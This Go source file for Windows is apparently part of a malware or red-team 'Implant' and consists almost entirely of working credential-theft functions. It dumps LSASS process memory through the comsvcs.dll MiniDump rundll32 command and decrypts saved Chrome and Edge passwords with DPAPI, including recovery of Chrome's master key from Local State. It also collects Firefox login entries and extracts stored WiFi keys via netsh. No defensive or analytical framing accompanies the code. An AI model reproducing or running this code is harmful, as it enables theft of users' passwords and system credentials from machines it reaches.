//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

var (
	modCrypt32        = windows.NewLazySystemDLL("Crypt32.dll")
	procCryptUnprotectData = modCrypt32.NewProc("CryptUnprotectData")

	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
	procOpenProcess = modKernel32.NewProc("OpenProcess")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

// Credential represents a harvested credential
type Credential struct {
	Source   string `json:"source"`
	URL      string `json:"url,omitempty"`
	Username string `json:"username"`
	Password string `json:"password"`
	Type     string `json:"type"`
}

// DumpLSASS dumps credentials from LSASS process memory
func (i *Implant) DumpLSASS() ([]byte, error) {
	// This is a simplified version - full LSASS dumping requires Mimikatz-level complexity
	// We'll attempt to dump using MiniDumpWriteDump

	// Find LSASS process
	lsassPID, err := findProcessByName("lsass.exe")
	if err != nil {
		return nil, fmt.Errorf("failed to find LSASS process: %v", err)
	}

	// Open LSASS process with required permissions
	hProcess, err := openProcess(lsassPID, windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ)
	if err != nil {
		return nil, fmt.Errorf("failed to open LSASS process: %v (requires SYSTEM/Admin)", err)
	}
	defer windows.CloseHandle(hProcess)

	// Create dump file
	dumpPath := filepath.Join(os.TempDir(), "lsass.dmp")
	defer os.Remove(dumpPath)

	// Use comsvcs.dll MiniDump method
	cmdArgs := []string{
		"/C",
		fmt.Sprintf("rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump %d %s full", lsassPID, dumpPath),
	}

	output, err := i.ExecuteShell("cmd.exe", cmdArgs)
	if err != nil {
		return nil, fmt.Errorf("failed to dump LSASS: %v, output: %s", err, output)
	}

	// Read dump file
	dumpData, err := ioutil.ReadFile(dumpPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read LSASS dump: %v", err)
	}

	result := map[string]interface{}{
		"status":    "success",
		"dump_size": len(dumpData),
		"dump_data": base64.StdEncoding.EncodeToString(dumpData),
		"method":    "comsvcs.dll MiniDump",
	}

	return json.Marshal(result)
}

// HarvestChromePasswords harvests saved passwords from Chrome
func (i *Implant) HarvestChromePasswords() ([]byte, error) {
	credentials := []Credential{}

	// Chrome profile paths
	localAppData := os.Getenv("LOCALAPPDATA")
	chromePaths := []string{
		filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data"),
		filepath.Join(localAppData, "Google", "Chrome", "User Data", "Profile 1", "Login Data"),
	}

	for _, dbPath := range chromePaths {
		if _, err := os.Stat(dbPath); os.IsNotExist(err) {
			continue
		}

		// Copy database to temp location (Chrome locks the file)
		tmpDB := filepath.Join(os.TempDir(), "chrome_login_data.db")
		defer os.Remove(tmpDB)

		data, err := ioutil.ReadFile(dbPath)
		if err != nil {
			continue
		}
		ioutil.WriteFile(tmpDB, data, 0600)

		// Open SQLite database
		db, err := sql.Open("sqlite3", tmpDB)
		if err != nil {
			continue
		}
		defer db.Close()

		// Query logins
		rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
		if err != nil {
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var url, username string
			var encryptedPassword []byte

			if err := rows.Scan(&url, &username, &encryptedPassword); err != nil {
				continue
			}

			// Decrypt password using DPAPI
			password, err := decryptDPAPI(encryptedPassword)
			if err != nil {
				continue
			}

			credentials = append(credentials, Credential{
				Source:   "Chrome",
				URL:      url,
				Username: username,
				Password: password,
				Type:     "password",
			})
		}
	}

	return json.Marshal(map[string]interface{}{
		"source":      "Chrome",
		"count":       len(credentials),
		"credentials": credentials,
	})
}

// HarvestFirefoxPasswords harvests saved passwords from Firefox
func (i *Implant) HarvestFirefoxPasswords() ([]byte, error) {
	credentials := []Credential{}

	// Firefox profile path
	appData := os.Getenv("APPDATA")
	firefoxPath := filepath.Join(appData, "Mozilla", "Firefox", "Profiles")

	// Find profiles
	profiles, err := ioutil.ReadDir(firefoxPath)
	if err != nil {
		return nil, fmt.Errorf("Firefox not found: %v", err)
	}

	for _, profile := range profiles {
		if !profile.IsDir() {
			continue
		}

		profilePath := filepath.Join(firefoxPath, profile.Name())
		loginsPath := filepath.Join(profilePath, "logins.json")

		if _, err := os.Stat(loginsPath); os.IsNotExist(err) {
			continue
		}

		// Read logins.json
		data, err := ioutil.ReadFile(loginsPath)
		if err != nil {
			continue
		}

		// Parse JSON (simplified - actual Firefox uses NSS encryption)
		var loginsData map[string]interface{}
		if err := json.Unmarshal(data, &loginsData); err != nil {
			continue
		}

		// Extract logins
		if logins, ok := loginsData["logins"].([]interface{}); ok {
			for _, login := range logins {
				if loginMap, ok := login.(map[string]interface{}); ok {
					cred := Credential{
						Source: "Firefox",
						Type:   "password",
					}

					if url, ok := loginMap["hostname"].(string); ok {
						cred.URL = url
					}
					if user, ok := loginMap["encryptedUsername"].(string); ok {
						cred.Username = user // Needs decryption
					}
					if pass, ok := loginMap["encryptedPassword"].(string); ok {
						cred.Password = pass // Needs decryption
					}

					credentials = append(credentials, cred)
				}
			}
		}
	}

	return json.Marshal(map[string]interface{}{
		"source":      "Firefox",
		"count":       len(credentials),
		"credentials": credentials,
		"note":        "Firefox passwords require NSS decryption",
	})
}

// HarvestEdgePasswords harvests saved passwords from Edge
func (i *Implant) HarvestEdgePasswords() ([]byte, error) {
	credentials := []Credential{}

	// Edge profile paths (Chromium-based)
	localAppData := os.Getenv("LOCALAPPDATA")
	edgePaths := []string{
		filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
	}

	for _, dbPath := range edgePaths {
		if _, err := os.Stat(dbPath); os.IsNotExist(err) {
			continue
		}

		// Copy database to temp location
		tmpDB := filepath.Join(os.TempDir(), "edge_login_data.db")
		defer os.Remove(tmpDB)

		data, err := ioutil.ReadFile(dbPath)
		if err != nil {
			continue
		}
		ioutil.WriteFile(tmpDB, data, 0600)

		// Open SQLite database
		db, err := sql.Open("sqlite3", tmpDB)
		if err != nil {
			continue
		}
		defer db.Close()

		// Query logins
		rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
		if err != nil {
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var url, username string
			var encryptedPassword []byte

			if err := rows.Scan(&url, &username, &encryptedPassword); err != nil {
				continue
			}

			// Decrypt password using DPAPI
			password, err := decryptDPAPI(encryptedPassword)
			if err != nil {
				continue
			}

			credentials = append(credentials, Credential{
				Source:   "Edge",
				URL:      url,
				Username: username,
				Password: password,
				Type:     "password",
			})
		}
	}

	return json.Marshal(map[string]interface{}{
		"source":      "Edge",
		"count":       len(credentials),
		"credentials": credentials,
	})
}

// HarvestAllBrowsers harvests credentials from all supported browsers
func (i *Implant) HarvestAllBrowsers() ([]byte, error) {
	allCredentials := make(map[string]interface{})

	// Chrome
	chromeData, err := i.HarvestChromePasswords()
	if err == nil {
		var chromeResult map[string]interface{}
		json.Unmarshal(chromeData, &chromeResult)
		allCredentials["chrome"] = chromeResult
	}

	// Firefox
	firefoxData, err := i.HarvestFirefoxPasswords()
	if err == nil {
		var firefoxResult map[string]interface{}
		json.Unmarshal(firefoxData, &firefoxResult)
		allCredentials["firefox"] = firefoxResult
	}

	// Edge
	edgeData, err := i.HarvestEdgePasswords()
	if err == nil {
		var edgeResult map[string]interface{}
		json.Unmarshal(edgeData, &edgeResult)
		allCredentials["edge"] = edgeResult
	}

	return json.Marshal(allCredentials)
}

// decryptDPAPI decrypts data using Windows DPAPI
func decryptDPAPI(encrypted []byte) (string, error) {
	var dataIn DATA_BLOB
	var dataOut DATA_BLOB

	dataIn.pbData = &encrypted[0]
	dataIn.cbData = uint32(len(encrypted))

	ret, _, _ := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&dataOut)),
	)

	if ret == 0 {
		return "", fmt.Errorf("CryptUnprotectData failed")
	}

	decrypted := make([]byte, dataOut.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(dataOut.pbData))[:dataOut.cbData:dataOut.cbData])

	return string(decrypted), nil
}

// decryptChromiumPassword decrypts Chromium-based browser passwords (newer versions use AES)
func decryptChromiumPassword(encrypted []byte, masterKey []byte) (string, error) {
	// Check for v10/v11 encryption (starts with "v10" or "v11")
	if len(encrypted) > 3 && string(encrypted[:3]) == "v10" {
		// Extract IV and ciphertext
		iv := encrypted[3:15]
		ciphertext := encrypted[15:]

		// Create AES cipher
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "", err
		}

		// Decrypt using AES-GCM
		aesgcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", err
		}

		plaintext, err := aesgcm.Open(nil, iv, ciphertext, nil)
		if err != nil {
			return "", err
		}

		return string(plaintext), nil
	}

	// Fallback to DPAPI
	return decryptDPAPI(encrypted)
}

// getChromeLocalState retrieves Chrome's master key from Local State file
func getChromeLocalState() ([]byte, error) {
	localAppData := os.Getenv("LOCALAPPDATA")
	localStatePath := filepath.Join(localAppData, "Google", "Chrome", "User Data", "Local State")

	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("os_crypt not found")
	}

	encryptedKey, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("encrypted_key not found")
	}

	// Decode base64
	decoded, err := base64.StdEncoding.DecodeString(encryptedKey)
	if err != nil {
		return nil, err
	}

	// Remove "DPAPI" prefix
	if len(decoded) < 5 {
		return nil, fmt.Errorf("invalid encrypted key")
	}
	encrypted := decoded[5:]

	// Decrypt using DPAPI
	masterKey, err := decryptDPAPI(encrypted)
	if err != nil {
		return nil, err
	}

	return []byte(masterKey), nil
}

// findProcessByName finds a process by name and returns its PID
func findProcessByName(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	if err := windows.Process32First(snapshot, &procEntry); err != nil {
		return 0, err
	}

	for {
		processName := windows.UTF16ToString(procEntry.ExeFile[:])
		if processName == name {
			return procEntry.ProcessID, nil
		}

		if err := windows.Process32Next(snapshot, &procEntry); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process not found: %s", name)
}

// openProcess opens a process with specified access rights
func openProcess(pid uint32, access uint32) (windows.Handle, error) {
	handle, _, err := procOpenProcess.Call(
		uintptr(access),
		0,
		uintptr(pid),
	)

	if handle == 0 {
		return 0, err
	}

	return windows.Handle(handle), nil
}

// HarvestWiFiPasswords extracts saved WiFi passwords
func (i *Implant) HarvestWiFiPasswords() ([]byte, error) {
	credentials := []Credential{}

	// Get WiFi profiles
	output, err := i.ExecuteShell("netsh", []string{"wlan", "show", "profiles"})
	if err != nil {
		return nil, err
	}

	// Parse profile names
	lines := bytes.Split(output, []byte("\n"))
	for _, line := range lines {
		if bytes.Contains(line, []byte("All User Profile")) {
			// Extract profile name
			parts := bytes.Split(line, []byte(":"))
			if len(parts) < 2 {
				continue
			}
			profile := string(bytes.TrimSpace(parts[1]))

			// Get password for profile
			passOutput, err := i.ExecuteShell("netsh", []string{"wlan", "show", "profile", profile, "key=clear"})
			if err != nil {
				continue
			}

			// Parse password
			passLines := bytes.Split(passOutput, []byte("\n"))
			for _, passLine := range passLines {
				if bytes.Contains(passLine, []byte("Key Content")) {
					passParts := bytes.Split(passLine, []byte(":"))
					if len(passParts) >= 2 {
						password := string(bytes.TrimSpace(passParts[1]))
						credentials = append(credentials, Credential{
							Source:   "WiFi",
							URL:      profile,
							Username: "",
							Password: password,
							Type:     "wifi",
						})
					}
				}
			}
		}
	}

	return json.Marshal(map[string]interface{}{
		"source":      "WiFi",
		"count":       len(credentials),
		"credentials": credentials,
	})
}
